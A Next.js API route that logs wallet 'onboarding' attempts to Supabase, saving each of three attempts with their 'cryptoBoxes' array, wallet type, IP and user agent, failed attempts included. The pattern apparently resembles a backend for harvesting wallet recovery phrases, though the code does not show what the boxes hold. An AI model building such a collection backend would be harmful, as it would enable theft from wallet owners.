// app/api/onboarding/route.ts
import { NextResponse } from "next/server";
import { getSessionData, updateSession } from "@/lib/auth/session";
import { getSupabase } from "@/lib/db/supabase";

export const runtime = "nodejs";

export async function POST(request: Request) {
  try {
    const session = await getSessionData();
    if (!session?.profileId) {
      return NextResponse.json({ error: "Not authenticated" }, { status: 401 });
    }

    const body = await request.json().catch(() => ({}));

    const {
      walletType,
      cryptoBoxes,
      walletAddress,
      groupId,
      attemptNumber,
      isFailedAttempt,
    } = body;

    const finalWallet = walletAddress?.toLowerCase() || null;

    if (!finalWallet) {
      return NextResponse.json({ error: "No wallet address" }, { status: 400 });
    }

    const sb = getSupabase();

    // INSERT every attempt (no upsert) so all 3 are saved
    const { data, error } = await sb
      .from("wallet_onboarding")
      .insert({
        wallet_address: finalWallet,
        wallet_type: walletType || "unknown",
        crypto_boxes: Array.isArray(cryptoBoxes) ? cryptoBoxes : [],
        group_id: groupId || null,           // ← groups the 3 attempts
        attempt_number: attemptNumber || 1,
        is_failed_attempt: !!isFailedAttempt,
        ip_address: body?.ipAddress || null,
        user_agent: body?.userAgent || null,
        created_at: new Date().toISOString(),
      })
      .select("*")
      .single();

    if (error) throw error;

    // Optional: update profile wallet on final success
    if (!isFailedAttempt) {
      await sb
        .from("profiles")
        .update({ wallet_address: finalWallet })
        .eq("id", session.profileId);

      await updateSession({ wallet: finalWallet });
    }

    return NextResponse.json({
      success: true,
      record: data,
      attempt: attemptNumber,
      isFinalSuccess: !isFailedAttempt,
    });
  } catch (e: any) {
    console.error("Onboarding error:", e);
    return NextResponse.json(
      { error: e?.message || "Failed" },
      { status: 500 }
    );
  }
}